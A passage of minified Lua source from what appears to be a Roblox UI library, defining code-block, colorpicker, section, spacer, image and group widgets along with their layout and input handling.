af.AddSignal(at.InputEnded,function()
ai(at.Button,0.08,{ImageTransparency=1}):Play()
ai(at.Button.UIScale,0.08,{Scale=1}):Play()
end)
af.AddSignal(at.MouseButton1Click,function()
if ao then
ao()
local aA=af.Icon"check"
at.Button.ImageLabel.Image=aA[1]
at.Button.ImageLabel.ImageRectSize=aA[2].ImageRectSize
at.Button.ImageLabel.ImageRectOffset=aA[2].ImageRectPosition

task.delay(1,function()
local aB=af.Icon"copy"
at.Button.ImageLabel.Image=aB[1]
at.Button.ImageLabel.ImageRectSize=aB[2].ImageRectSize
at.Button.ImageLabel.ImageRectOffset=aB[2].ImageRectPosition
end)
end
end)
end

return aq
end

return aa end function a.R()

local aa=a.load'd'local af=
aa.New


local ag=a.load'Q'

local ai={}

function ai.New(ak,al)
local am={
__type="Code",
Title=al.Title,
Code=al.Code,
CodeSize=al.CodeSize or 18,
Height=al.Height,
CodeTheme=al.CodeTheme,
Locked=false,
CanCopied=al.CanCopied~=false,
OnCopy=al.OnCopy,

Index=al.Index,
}

local an=not am.Locked











local ao=ag.New(am,al.Window,al.Parent,function()
if an then
local ao=am.Title or"code"
local ap,aq=pcall(function()
if toclipboard then
toclipboard(am.Code)
end
if setclipboard then
setclipboard(am.Code)
end

if am.OnCopy then
am.OnCopy()
end
end)
if not ap then
al.WindUI:Notify{
Title="Error",
Content="The "..ao.." is not copied. Error: "..aq,
Icon="x",
Duration=5,
}
end
end
end,al.WindUI.UIScale)

function am.SetCode(ap,aq)
ao.Set(aq)
am.Code=aq
end

function am.Set(ap,aq)
return am.SetCode(aq)
end

function am.Destroy(ap)
ao.Destroy()
am=nil
end

function am.UpdateShape(ap)
if al.Window.NewElements then
local aq=aa:GetElementPosition(
ap.Elements,
am.Index,
al.ParentType=="HStack"or al.ParentType=="Group"
)

if aq and ao.CodeFrameModule then
ao.CodeFrameModule:SetType(aq)

print(aq)
ao.TopbarFrameModule:SetType(
table.find({"Squircle-BL-BR","SquircleH-BL-BR"},aq)~=nil and"Square"or aq
)
end
end
end

am.UIElements={Main=ao.CodeFrame}
am.ElementFrame=ao.CodeFrame

return am.__type,am
end

return ai end function a.S()

local aa=a.load'd'
local af=aa.New local ag=
aa.Tween

local ai=(cloneref or clonereference or function(ai)
return ai
end)

local ak=ai(game:GetService"UserInputService")
ai(game:GetService"TouchInputService")
local al=ai(game:GetService"RunService")
local am=ai(game:GetService"Players")local an=

al.RenderStepped
local ao=am.LocalPlayer
local ap=ao:GetMouse()

local aq=a.load'm'.New
local ar=a.load'n'.New

local as={
UICorner=9,

}

local at

function as.Colorpicker(au,av,aw,ax,ay)
local az={
__type="Colorpicker",
Title=av.Title,
Desc=av.Desc,
Default=av.Value or av.Default,
Callback=av.Callback,
Transparency=av.Transparency,
UIElements=av.UIElements,

TextPadding=10,
}

local aA={}
local aB=az.Transparency~=nil

function az.SetHSVFromRGB(b,d)
local f,g,h=Color3.toHSV(d)
az.Hue=f
az.Sat=g
az.Vib=h
end

az:SetHSVFromRGB(az.Default)

local b=a.load'o'
local d=b.Create(nil,"Dialog",aw,ax,aw.UIElements.Main.Main)

az.ColorpickerFrame=d

d.UIElements.Main.Size=UDim2.new(1,0,0,0)



local f,g,h=az.Hue,az.Sat,az.Vib

az.UIElements.Title=af("TextLabel",{
Text=az.Title,
TextSize=20,
FontFace=Font.new(aa.Font,Enum.FontWeight.SemiBold),
TextXAlignment="Left",
Size=UDim2.new(0,0,0,0),
AutomaticSize="Y",
ThemeTag={
TextColor3="Text",
},
BackgroundTransparency=1,
Parent=d.UIElements.Main,
},{
af("UIPadding",{
PaddingTop=UDim.new(0,az.TextPadding/2),
PaddingLeft=UDim.new(0,az.TextPadding/2),
PaddingRight=UDim.new(0,az.TextPadding/2),
PaddingBottom=UDim.new(0,az.TextPadding/2),
}),
})





local i=af("Frame",{
Size=UDim2.new(1,0,1,0),
Position=UDim2.new(0,0,0,0),
BackgroundTransparency=1,
})

local l=af("Frame",{
Size=UDim2.new(0,14,0,14),
AnchorPoint=Vector2.new(0.5,0.5),
Position=UDim2.new(0.5,0,0,0),
Parent=i,
BackgroundColor3=az.Default,
},{
af("UIStroke",{
Thickness=2,
Transparency=0.1,
ThemeTag={
Color="Text",
},
}),
af("UICorner",{
CornerRadius=UDim.new(1,0),
}),
})

az.UIElements.SatVibMap=af("ImageLabel",{
Size=UDim2.fromOffset(160,158),
Position=UDim2.fromOffset(0,40+az.TextPadding),
Image="rbxassetid://4155801252",
BackgroundColor3=Color3.fromHSV(f,1,1),
BackgroundTransparency=0,
Parent=d.UIElements.Main,
},{
af("UICorner",{
CornerRadius=UDim.new(0,8),
}),
aa.NewRoundFrame(8,"SquircleOutline",{
ThemeTag={
ImageColor3="Outline",
},
Size=UDim2.new(1,0,1,0),
ImageTransparency=0.85,
ZIndex=99999,
},{
af("UIGradient",{
Rotation=45,
Color=ColorSequence.new{
ColorSequenceKeypoint.new(0.0,Color3.fromRGB(255,255,255)),
ColorSequenceKeypoint.new(0.5,Color3.fromRGB(255,255,255)),
ColorSequenceKeypoint.new(1.0,Color3.fromRGB(255,255,255)),
},
Transparency=NumberSequence.new{
NumberSequenceKeypoint.new(0.0,0.1),
NumberSequenceKeypoint.new(0.5,1),
NumberSequenceKeypoint.new(1.0,0.1),
},
}),
}),

l,
})

az.UIElements.Inputs=af("Frame",{
AutomaticSize="XY",
Size=UDim2.new(0,0,0,0),
Position=UDim2.fromOffset(
aB and 240 or 210,
40+az.TextPadding
),
BackgroundTransparency=1,
Parent=d.UIElements.Main,
},{
af("UIListLayout",{
Padding=UDim.new(0,4),
FillDirection="Vertical",
}),
})





local m=af("Frame",{
BackgroundColor3=az.Default,
Size=UDim2.fromScale(1,1),
BackgroundTransparency=az.Transparency,
},{
af("UICorner",{
CornerRadius=UDim.new(0,8),
}),
})

af("ImageLabel",{
Image="http://www.roblox.com/asset/?id=14204231522",
ImageTransparency=0.45,
ScaleType=Enum.ScaleType.Tile,
TileSize=UDim2.fromOffset(40,40),
BackgroundTransparency=1,
Position=UDim2.fromOffset(85,208+az.TextPadding),
Size=UDim2.fromOffset(75,24),
Parent=d.UIElements.Main,
},{
af("UICorner",{
CornerRadius=UDim.new(0,8),
}),
aa.NewRoundFrame(8,"SquircleOutline",{
ThemeTag={
ImageColor3="Outline",
},
Size=UDim2.new(1,0,1,0),
ImageTransparency=0.85,
ZIndex=99999,
},{
af("UIGradient",{
Rotation=60,
Color=ColorSequence.new{
ColorSequenceKeypoint.new(0.0,Color3.fromRGB(255,255,255)),
ColorSequenceKeypoint.new(0.5,Color3.fromRGB(255,255,255)),
ColorSequenceKeypoint.new(1.0,Color3.fromRGB(255,255,255)),
},
Transparency=NumberSequence.new{
NumberSequenceKeypoint.new(0.0,0.1),
NumberSequenceKeypoint.new(0.5,1),
NumberSequenceKeypoint.new(1.0,0.1),
},
}),
}),







m,
})

local p=af("Frame",{
BackgroundColor3=az.Default,
Size=UDim2.fromScale(1,1),
BackgroundTransparency=0,
ZIndex=9,
},{
af("UICorner",{
CornerRadius=UDim.new(0,8),
}),
})

af("ImageLabel",{
Image="http://www.roblox.com/asset/?id=14204231522",
ImageTransparency=0.45,
ScaleType=Enum.ScaleType.Tile,
TileSize=UDim2.fromOffset(40,40),
BackgroundTransparency=1,
Position=UDim2.fromOffset(0,208+az.TextPadding),
Size=UDim2.fromOffset(75,24),
Parent=d.UIElements.Main,
},{
af("UICorner",{
CornerRadius=UDim.new(0,8),
}),







aa.NewRoundFrame(8,"SquircleOutline",{
ThemeTag={
ImageColor3="Outline",
},
Size=UDim2.new(1,0,1,0),
ImageTransparency=0.85,
ZIndex=99999,
},{
af("UIGradient",{
Rotation=60,
Color=ColorSequence.new{
ColorSequenceKeypoint.new(0.0,Color3.fromRGB(255,255,255)),
ColorSequenceKeypoint.new(0.5,Color3.fromRGB(255,255,255)),
ColorSequenceKeypoint.new(1.0,Color3.fromRGB(255,255,255)),
},
Transparency=NumberSequence.new{
NumberSequenceKeypoint.new(0.0,0.1),
NumberSequenceKeypoint.new(0.5,1),
NumberSequenceKeypoint.new(1.0,0.1),
},
}),
}),
p,
})

local r={}

for u=0,1,0.1 do
table.insert(r,ColorSequenceKeypoint.new(u,Color3.fromHSV(u,1,1)))
end

local u=af("UIGradient",{
Color=ColorSequence.new(r),
Rotation=90,
})

local v=af("Frame",{
Size=UDim2.new(0,14,0,14),
AnchorPoint=Vector2.new(0.5,0.5),
Position=UDim2.new(0.5,0,0,0),
Parent=i,


BackgroundColor3=az.Default,
},{
af("UIStroke",{
Thickness=2,
Transparency=0.1,
ThemeTag={
Color="Text",
},
}),
af("UICorner",{
CornerRadius=UDim.new(1,0),
}),
})

local x=af("Frame",{
Size=UDim2.fromOffset(6,192),
Position=UDim2.fromOffset(180,40+az.TextPadding),
Parent=d.UIElements.Main,
},{
af("UICorner",{
CornerRadius=UDim.new(1,0),
}),
u,
i,
})

local function CreateNewInput(z,A)
local B=ar(z,nil,az.UIElements.Inputs,nil,nil,nil,nil,nil,true)

af("TextLabel",{
BackgroundTransparency=1,
TextTransparency=0.4,
TextSize=17,
FontFace=Font.new(aa.Font,Enum.FontWeight.Regular),
AutomaticSize="XY",
ThemeTag={
TextColor3="Placeholder",
},
AnchorPoint=Vector2.new(1,0.5),
Position=UDim2.new(1,-12,0.5,0),
Parent=B.Frame,
Text=z,
})

af("UIScale",{
Parent=B,
Scale=0.85,
})

B.Frame.Frame.TextBox.Text=A
B.Size=UDim2.new(0,150,0,42)

return B
end

local function ToRGB(z)
return{
R=math.floor(z.R*255),
G=math.floor(z.G*255),
B=math.floor(z.B*255),
}
end

local z=CreateNewInput("Hex","#"..az.Default:ToHex())

local A=CreateNewInput("Red",ToRGB(az.Default).R)
local B=CreateNewInput("Green",ToRGB(az.Default).G)
local C=CreateNewInput("Blue",ToRGB(az.Default).B)
local F
if aB then
F=CreateNewInput("Alpha",((1-az.Transparency)*100).."%")
end

local G=af("Frame",{
Size=UDim2.new(0,0,0,40),
AutomaticSize="Y",
Position=UDim2.new(0,0,0,254+az.TextPadding),
BackgroundTransparency=1,
Parent=d.UIElements.Main,
LayoutOrder=4,
},{
af("UIListLayout",{
Padding=UDim.new(0,6),
FillDirection="Horizontal",
HorizontalAlignment="Right",
}),






})

aa.AddSignal(d.UIElements.Main:GetPropertyChangedSignal"AbsoluteSize",function()
az.UIElements.Title.Size=UDim2.new(
0,
d.UIElements.Main.AbsoluteSize.X/av.UIScale-(d.UIPadding*2),
0,
0
)
G.Size=UDim2.new(
0,
d.UIElements.Main.AbsoluteSize.X/av.UIScale-d.UIPadding*2,
0,
40
)
end)

local H={
{
Title="Cancel",
Variant="Secondary",
Callback=function()
av.IsShowed=false
for H,J in next,aA do
J:Disconnect()
end
aA={}
end,
},
{
Title="Apply",

Variant="Primary",
Callback=function()
av.IsShowed=false
for H,J in next,aA do
J:Disconnect()
end
aA={}

ay(Color3.fromHSV(az.Hue,az.Sat,az.Vib),az.Transparency)
end,
},
}

for J,L in next,H do
local M=aq(
L.Title,
L.Icon,
L.Callback,
L.Variant,
G,
d,
true
)
M.Size=UDim2.new(0.5,-3,0,40)
M.AutomaticSize="None"
end

local J,L,M
if aB then
local N=af("Frame",{
Size=UDim2.new(1,0,1,0),
Position=UDim2.fromOffset(0,0),
BackgroundTransparency=1,
})

L=af("ImageLabel",{
Size=UDim2.new(0,14,0,14),
AnchorPoint=Vector2.new(0.5,0.5),
Position=UDim2.new(0.5,0,0,0),
ThemeTag={
BackgroundColor3="Text",
},
Parent=N,
},{
af("UIStroke",{
Thickness=2,
Transparency=0.1,
ThemeTag={
Color="Text",
},
}),
af("UICorner",{
CornerRadius=UDim.new(1,0),
}),
})

M=af("Frame",{
Size=UDim2.fromScale(1,1),
},{
af("UIGradient",{
Transparency=NumberSequence.new{
NumberSequenceKeypoint.new(0,0),
NumberSequenceKeypoint.new(1,1),
},
Rotation=270,
}),
af("UICorner",{
CornerRadius=UDim.new(0,6),
}),
})

J=af("Frame",{
Size=UDim2.fromOffset(6,192),
Position=UDim2.fromOffset(210,40+az.TextPadding),
Parent=d.UIElements.Main,
BackgroundTransparency=1,
},{
af("UICorner",{
CornerRadius=UDim.new(1,0),
}),
af("ImageLabel",{
Image="rbxassetid://14204231522",
ImageTransparency=0.45,
ScaleType=Enum.ScaleType.Tile,
TileSize=UDim2.fromOffset(40,40),
BackgroundTransparency=1,
Size=UDim2.fromScale(1,1),
},{
af("UICorner",{
CornerRadius=UDim.new(1,0),
}),
}),
M,
N,
})
end

function az.Round(N,O,P)
if P==0 then
return math.floor(O)
end
O=tostring(O)
return O:find"%."and tonumber(O:sub(1,O:find"%."+P))or O
end

function az.Update(N,O,P)
if O then
f,g,h=Color3.toHSV(O)
else
f,g,h=az.Hue,az.Sat,az.Vib
end

az.UIElements.SatVibMap.BackgroundColor3=Color3.fromHSV(f,1,1)
l.Position=UDim2.new(g,0,1-h,0)
l.BackgroundColor3=Color3.fromHSV(f,g,h)
p.BackgroundColor3=Color3.fromHSV(f,g,h)
v.BackgroundColor3=Color3.fromHSV(f,1,1)
v.Position=UDim2.new(0.5,0,f,0)

z.Frame.Frame.TextBox.Text="#"..Color3.fromHSV(f,g,h):ToHex()
A.Frame.Frame.TextBox.Text=ToRGB(Color3.fromHSV(f,g,h)).R
B.Frame.Frame.TextBox.Text=ToRGB(Color3.fromHSV(f,g,h)).G
C.Frame.Frame.TextBox.Text=ToRGB(Color3.fromHSV(f,g,h)).B

if P or aB then
p.BackgroundTransparency=az.Transparency or P
M.BackgroundColor3=Color3.fromHSV(f,g,h)
L.BackgroundColor3=Color3.fromHSV(f,g,h)
L.BackgroundTransparency=az.Transparency or P
L.Position=UDim2.new(0.5,0,1-az.Transparency or P,0)
F.Frame.Frame.TextBox.Text=az:Round(
(1-az.Transparency or P)*100,
0
).."%"
end
end

az:Update(az.Default,az.Transparency)

local function GetRGB()
local N=Color3.fromHSV(az.Hue,az.Sat,az.Vib)
return{R=math.floor(N.r*255),G=math.floor(N.g*255),B=math.floor(N.b*255)}
end



local function clamp(N,O,P)
return math.clamp(tonumber(N)or 0,O,P)
end

table.insert(
aA,
aa.AddSignal(z.Frame.Frame.TextBox.FocusLost,function(N)
if N then
local O=z.Frame.Frame.TextBox.Text:gsub("#","")
local P,Q=pcall(Color3.fromHex,O)
if P and typeof(Q)=="Color3"then
az.Hue,az.Sat,az.Vib=Color3.toHSV(Q)
az:Update()
az.Default=Q
end
end
end)
)

local function updateColorFromInput(N,O)
aa.AddSignal(N.Frame.Frame.TextBox.FocusLost,function(P)
if P then
local Q=N.Frame.Frame.TextBox
local R=GetRGB()
local S=clamp(Q.Text,0,255)
Q.Text=tostring(S)

R[O]=S
local T=Color3.fromRGB(R.R,R.G,R.B)
az.Hue,az.Sat,az.Vib=Color3.toHSV(T)
az:Update()
end
end)
end

updateColorFromInput(A,"R")
updateColorFromInput(B,"G")
updateColorFromInput(C,"B")

if aB then
aa.AddSignal(F.Frame.Frame.TextBox.FocusLost,function(N)
if N then
local O=F.Frame.Frame.TextBox
local P=clamp(O.Text,0,100)
O.Text=tostring(P)

az.Transparency=1-P*0.01
az:Update(nil,az.Transparency)
end
end)
end



local function UpdateSatVib(N,O)
local P=N.AbsolutePosition.X
local Q=P+N.AbsoluteSize.X
local R=N.AbsolutePosition.Y
local S=R+N.AbsoluteSize.Y

local T=math.clamp(ap.X,P,Q)
local U=math.clamp(ap.Y,R,S)

O.Sat=(T-P)/(Q-P)
O.Vib=1-((U-R)/(S-R))

O:Update()
end

local function UpdateHue(N,O)
local P=N.AbsolutePosition.Y
local Q=P+N.AbsoluteSize.Y

local R=math.clamp(ap.Y,P,Q)

O.Hue=(R-P)/(Q-P)

O:Update()
end

local function UpdateTransparency(N,O)
local P=N.AbsolutePosition.Y
local Q=P+N.AbsoluteSize.Y

local R=math.clamp(ap.Y,P,Q)

O.Transparency=1-((R-P)/(Q-P))

O:Update()
end

local N=ax.GenerateGUID()

table.insert(
aA,
ak.InputChanged:Connect(function(O)
if
O.UserInputType~=Enum.UserInputType.MouseMovement
and O.UserInputType~=Enum.UserInputType.Touch
then
return
end

if at=="SatVib"then
UpdateSatVib(az.UIElements.SatVibMap,az)
elseif at=="Hue"then
UpdateHue(x,az)
elseif at=="Transparency"then
UpdateTransparency(J,az)
end
end)
)

table.insert(
aA,
az.UIElements.SatVibMap.InputBegan:Connect(function(O)
if
O.UserInputType~=Enum.UserInputType.MouseButton1
and O.UserInputType~=Enum.UserInputType.Touch
then
return
end

if ax.CurrentInput and ax.CurrentInput~=N then
return
end
ax.CurrentInput=N

if at and at~="SatVib"then
return
end

at="SatVib"

UpdateSatVib(az.UIElements.SatVibMap,az)
end)
)

table.insert(
aA,
x.InputBegan:Connect(function(O)
if
O.UserInputType~=Enum.UserInputType.MouseButton1
and O.UserInputType~=Enum.UserInputType.Touch
then
return
end

if ax.CurrentInput and ax.CurrentInput~=N then
return
end
ax.CurrentInput=N

if at and at~="Hue"then
return
end

at="Hue"

UpdateHue(x,az)
end)
)

if J then
table.insert(
aA,
J.InputBegan:Connect(function(O)
if
O.UserInputType~=Enum.UserInputType.MouseButton1
and O.UserInputType~=Enum.UserInputType.Touch
then
return
end

if ax.CurrentInput and ax.CurrentInput~=N then
return
end
ax.CurrentInput=N

if at and at~="Transparency"then
return
end

at="Transparency"

UpdateTransparency(J,az)
end)
)
end

table.insert(
aA,
ak.InputEnded:Connect(function(O)
at=nil

if ax.CurrentInput and ax.CurrentInput~=N then
return
end
ax.CurrentInput=nil
end)
)

return az
end

function as.New(au,av)
local aw={
__type="Colorpicker",
Title=av.Title or"Colorpicker",
Desc=av.Desc or nil,
Locked=av.Locked or false,
LockedTitle=av.LockedTitle,
Default=av.Default or Color3.new(1,1,1),
Callback=av.Callback or function()end,

UIScale=av.UIScale,
Transparency=av.Transparency,
UIElements={},

IsShowed=false,
}

local ax=true



aw.ColorpickerFrame=a.load'C'{
Title=aw.Title,
Desc=aw.Desc,
Parent=av.Parent,
TextOffset=40,
Hover=false,
Tab=av.Tab,
Index=av.Index,
Window=av.Window,
ElementTable=aw,
ParentConfig=av,
Tags=av.Tags,
}

aw.UIElements.Colorpicker=aa.NewRoundFrame(as.UICorner,"Squircle",{
ImageTransparency=0,
Active=true,
ImageColor3=aw.Default,
Parent=aw.ColorpickerFrame.UIElements.Main,
Size=UDim2.new(0,26,0,26),
AnchorPoint=Vector2.new(1,0),
Position=UDim2.new(1,0,0,0),
ZIndex=2,
},{
aa.NewRoundFrame(as.UICorner,"SquircleGlass",{
Size=UDim2.new(1,0,1,0),
ThemeTag={
ImageColor3="Outline",
},
ImageTransparency=0.55,
}),
},true)

function aw.Lock(ay)
aw.Locked=true
ax=false
return aw.ColorpickerFrame:Lock(aw.LockedTitle)
end
function aw.Unlock(ay)
aw.Locked=false
ax=true
return aw.ColorpickerFrame:Unlock()
end

if aw.Locked then
aw:Lock()
end

function aw.Update(ay,az,aA)
aw.UIElements.Colorpicker.ImageTransparency=aA or 0
aw.UIElements.Colorpicker.ImageColor3=az
aw.Default=az
if aA then
aw.Transparency=aA
end
end

function aw.Set(ay,az,aA)
return aw:Update(az,aA)
end

aa.AddSignal(aw.UIElements.Colorpicker.MouseButton1Click,function()
if ax and not aw.IsShowed then
aw.IsShowed=true

as:Colorpicker(aw,av.Window,av.WindUI,function(ay,az)
aw:Update(ay,az)
aw.Default=ay
aw.Transparency=az
aa.SafeCallback(aw.Callback,ay,az)
end).ColorpickerFrame
:Open()
end
end)

return aw.__type,aw
end

return as end function a.T()

local aa=a.load'd'
local af=aa.New
local ai=aa.Tween

local ak={}

function ak.New(al,am)
local an={
__type="Section",
Title=am.Title or"Section",
Desc=am.Desc,
Icon=am.Icon,
IconThemed=am.IconThemed,
TextXAlignment=am.TextXAlignment or"Left",
TextSize=am.TextSize or 19,
DescTextSize=am.DescTextSize or 16,
Box=am.Box or false,
BoxBorder=am.BoxBorder or false,
FontWeight=am.FontWeight or Enum.FontWeight.SemiBold,
DescFontWeight=am.DescFontWeight or Enum.FontWeight.Medium,
TextTransparency=am.TextTransparency or 0.05,
DescTextTransparency=am.DescTextTransparency or 0.4,
Opened=am.Opened or false,
UIElements={},

HeaderSize=48,
IconSize=20,
Padding=10,

Elements={},

Expandable=false,
}

local ao

function an.SetIcon(ap,aq)
an.Icon=aq or nil
if ao then
ao:Destroy()
end
if aq then
ao=aa.Image(
aq,
aq..":"..an.Title,
0,
am.Window.Folder,
an.__type,
true,
an.IconThemed,
"SectionIcon"
)
ao.Size=UDim2.new(0,an.IconSize,0,an.IconSize)
end
end

local ap=af("Frame",{
Size=UDim2.new(0,an.IconSize,0,an.IconSize),
BackgroundTransparency=1,
Visible=false,
},{
af("ImageLabel",{
Size=UDim2.new(1,0,1,0),
BackgroundTransparency=1,
Image=aa.Icon"chevron-down"[1],
ImageRectSize=aa.Icon"chevron-down"[2].ImageRectSize,
ImageRectOffset=aa.Icon"chevron-down"[2].ImageRectPosition,
ThemeTag={
ImageTransparency="SectionExpandIconTransparency",
ImageColor3="SectionExpandIcon",
},
}),
})

if an.Icon then
an:SetIcon(an.Icon)
end

local aq=af("Frame",{
Size=UDim2.new(1,0,1,0),
BackgroundTransparency=1,
},{
af("UIListLayout",{
FillDirection="Vertical",
HorizontalAlignment=an.TextXAlignment,
VerticalAlignment="Center",
Padding=UDim.new(0,4),
}),
})

local ar,as

local function createTitle(at,au)
return af("TextLabel",{
BackgroundTransparency=1,
TextXAlignment=an.TextXAlignment,
AutomaticSize="Y",
TextSize=au=="Title"and an.TextSize or an.DescTextSize,
TextTransparency=au=="Title"and an.TextTransparency or an.DescTextTransparency,
ThemeTag={
TextColor3="Text",
},
FontFace=Font.new(aa.Font,au=="Title"and an.FontWeight or an.DescFontWeight),


Text=at,
Size=UDim2.new(1,0,0,0),
TextWrapped=true,
Parent=aq,
})
end

ar=createTitle(an.Title,"Title")
if an.Desc then
as=createTitle(an.Desc,"Desc")
end

local function UpdateTitleSize()
local at=0
if ao then
at=at-(an.IconSize+8)
end
if ap.Visible then
at=at-(an.IconSize+8)
end
aq.Size=UDim2.new(1,at,0,0)
end

local at=aa.NewRoundFrame(am.Window.ElementConfig.UICorner,"Squircle",{
Size=UDim2.new(1,0,0,0),
BackgroundTransparency=1,
Parent=am.Parent,

AutomaticSize="Y",
ThemeTag={
ImageTransparency=an.Box and"SectionBoxBackgroundTransparency"or nil,
ImageColor3="SectionBoxBackground",
},
ImageTransparency=not an.Box and 1 or nil,
},{
aa.NewRoundFrame(am.Window.ElementConfig.UICorner-1,"SquircleOutline",{
Size=UDim2.new(1,0,1,0),



ThemeTag={

ImageColor3="SectionBoxBorder",
},
ImageTransparency=an.Box and an.BoxBorder and 0.92 or 1,
Name="Outline",
ClipsDescendants=true,
},{
af("TextButton",{
Size=UDim2.new(1,0,0,an.Expandable and 0 or(not as and an.HeaderSize or 0)),
BackgroundTransparency=1,
AutomaticSize=(not an.Expandable or as)and"Y"or nil,
Text="",
Name="Top",
},{
an.Box and af("UIPadding",{
PaddingTop=UDim.new(
0,
am.Window.ElementConfig.UIPadding+(am.Window.NewElements and 4 or 0)
),
PaddingLeft=UDim.new(
0,
am.Window.ElementConfig.UIPadding+(am.Window.NewElements and 4 or 0)
),
PaddingRight=UDim.new(
0,
am.Window.ElementConfig.UIPadding+(am.Window.NewElements and 4 or 0)
),
PaddingBottom=UDim.new(
0,
am.Window.ElementConfig.UIPadding+(am.Window.NewElements and 4 or 0)
),
})or nil,
ao,
aq,
af("UIListLayout",{
Padding=UDim.new(0,8),
FillDirection="Horizontal",
VerticalAlignment="Center",
HorizontalAlignment="Left",
}),
ap,
}),
af("Frame",{
BackgroundTransparency=1,
Size=UDim2.new(1,0,0,0),
AutomaticSize="Y",
Name="Content",
Visible=false,
Position=UDim2.new(0,0,0,an.HeaderSize+10),
},{
an.Box and af("UIPadding",{
PaddingLeft=UDim.new(0,am.Window.ElementConfig.UIPadding/1.5),
PaddingRight=UDim.new(0,am.Window.ElementConfig.UIPadding/1.5),
PaddingBottom=UDim.new(0,am.Window.ElementConfig.UIPadding/1.5),
})or nil,
af("UIListLayout",{
FillDirection="Vertical",
Padding=UDim.new(0,am.Tab.Gap),
VerticalAlignment="Top",
}),
}),
}),
})





an.ElementFrame=at

at.Outline.Top:GetPropertyChangedSignal"AbsoluteSize":Connect(function()
at.Outline.Content.Position=UDim2.new(0,0,0,(at.Outline.Top.AbsoluteSize.Y/am.UIScale)+10)

if an.Opened then
an:Open(true)
else
an.Close(true)
end
end)

local au=am.ElementsModule

au.Load(an,at.Outline.Content,au.Elements,am.Window,am.WindUI,function()
if not an.Expandable then
an.Expandable=true
ap.Visible=true
UpdateTitleSize()
end
end,au,am.UIScale,am.Tab)

UpdateTitleSize()

function an.SetTitle(av,aw)
an.Title=aw
ar.Text=aw
end

function an.SetDesc(av,aw)
an.Desc=aw
if not as then
as=createTitle(aw,"Desc")
end
as.Text=aw
end

function an.Destroy(av)
for aw,ax in next,an.Elements do
ax:Destroy()
end








at:Destroy()
end

function an.Open(av,aw)
if an.Expandable then
an.Opened=true
if aw then
at.Size=UDim2.new(
at.Size.X.Scale,
at.Size.X.Offset,
0,
at.Outline.Top.AbsoluteSize.Y/am.UIScale
+(at.Outline.Content.AbsoluteSize.Y/am.UIScale)
+10
)
ap.ImageLabel.Rotation=180
else
ai(at,0.33,{
Size=UDim2.new(
at.Size.X.Scale,
at.Size.X.Offset,
0,
at.Outline.Top.AbsoluteSize.Y/am.UIScale
+(at.Outline.Content.AbsoluteSize.Y/am.UIScale)
+10
),
},Enum.EasingStyle.Quint,Enum.EasingDirection.Out):Play()

ai(
ap.ImageLabel,
0.2,
{Rotation=180},
Enum.EasingStyle.Quint,
Enum.EasingDirection.Out
):Play()
end
end
end
function an.Close(av,aw)
if an.Expandable then
an.Opened=false
if aw then
at.Size=UDim2.new(
at.Size.X.Scale,
at.Size.X.Offset,
0,
(at.Outline.Top.AbsoluteSize.Y/am.UIScale)
)
ap.ImageLabel.Rotation=0
else
ai(at,0.26,{
Size=UDim2.new(
at.Size.X.Scale,
at.Size.X.Offset,
0,
(at.Outline.Top.AbsoluteSize.Y/am.UIScale)
),
},Enum.EasingStyle.Quint,Enum.EasingDirection.Out):Play()
ai(
ap.ImageLabel,
0.2,
{Rotation=0},
Enum.EasingStyle.Quint,
Enum.EasingDirection.Out
):Play()
end
end
end

aa.AddSignal(at.Outline.Top.MouseButton1Click,function()
if an.Expandable then
if an.Opened then
an:Close()
else
an:Open()
end
end
end)

aa.AddSignal(at.Outline.Content.UIListLayout:GetPropertyChangedSignal"AbsoluteContentSize",function()
if an.Opened then
an:Open(true)
else
an:Close(true)
end
end)

task.defer(function()
if an.Expandable then








at.Size=
UDim2.new(at.Size.X.Scale,at.Size.X.Offset,0,at.Outline.Top.AbsoluteSize.Y/am.UIScale)
at.AutomaticSize="None"
at.Outline.Top.Size=UDim2.new(1,0,0,(not as and an.HeaderSize or 0))
at.Outline.Top.AutomaticSize=(not an.Expandable or as)and"Y"or"None"
at.Outline.Content.Visible=true
end
if an.Opened then
an:Open()
else
an:Close(true)
end
end)

return an.__type,an
end

return ak end function a.U()

local aa=a.load'd'
local af=aa.New

local ai={}

function ai.New(ak,al)
local am=af("Frame",{
Parent=al.Parent,
Size=not table.find({"Group","HStack"},al.ParentType)and UDim2.new(1,-7,0,7*(al.Columns or 1))or UDim2.new(0,7*(al.Columns or 1),0,0),
BackgroundTransparency=1,
})

return"Space",{__type="Space",ElementFrame=am}
end

return ai end function a.V()
local aa=a.load'd'
local af=aa.New

local ai={}

local function ParseAspectRatio(ak)
if type(ak)=="string"then
local al,am=ak:match"(%d+):(%d+)"
if al and am then
return tonumber(al)/tonumber(am)
end
elseif type(ak)=="number"then
return ak
end
return nil
end

function ai.New(ak,al)
local am={
__type="Image",
Image=al.Image or"",
AspectRatio=al.AspectRatio or"16:9",
Radius=al.Radius or al.Window.ElementConfig.UICorner,
}
local an=aa.Image(
am.Image,
am.Image,
am.Radius,
al.Window.Folder,
"Image",
false
)
if an and an.Parent then
an.Parent=al.Parent
an.Size=UDim2.new(1,0,0,0)
an.BackgroundTransparency=1












local ao=ParseAspectRatio(am.AspectRatio)
local ap

if ao then
ap=af("UIAspectRatioConstraint",{
Parent=an,
AspectRatio=ao,
AspectType="ScaleWithParentSize",
DominantAxis="Width"
})
end

function am.Destroy(aq)
an:Destroy()
end
end

return am.__type,am
end

return ai end function a.W()
local aa=a.load'd'
local af=aa.New

local ai={}

function ai.New(ak,al)
local am={
__type="Group",
Elements={},
ElementFrame=nil,
}

local an=af("Frame",{
Size=UDim2.new(1,0,0,0),
BackgroundTransparency=1,
AutomaticSize="Y",
Parent=al.Parent,
},{
af("UIListLayout",{
FillDirection="Horizontal",
HorizontalAlignment="Center",

Padding=UDim.new(0,al.Tab and al.Tab.Gap or(al.Window.NewElements and 1 or 6))
}),
})

am.ElementFrame=an

local ao=al.ElementsModule
ao.Load(
am,
an,
ao.Elements,
al.Window,
al.WindUI,
function(ap,aq)
local ar=al.Tab and al.Tab.Gap or(al.Window.NewElements and 1 or 6)

local as={}
local at=0

for au,av in next,aq do
if av.__type=="Space"then
at=at+(av.ElementFrame.Size.X.Offset or 6)
elseif av.__type=="Divider"then
at=at+(av.ElementFrame.Size.X.Offset or 1)
else
table.insert(as,av)
end
end

local au=#as
if au==0 then return end

local av=1/au

local aw=ar*(au-1)

local ax=-(aw+at)

local ay=math.floor(ax/au)
local az=ax-(ay*au)

for aA,aB in next,as do
local b=ay
if aA<=math.abs(az)then
b=b-1
end

if aB.ElementFrame then
aB.ElementFrame.Size=UDim2.new(av,b,1,0)
end
end
end,
ao,
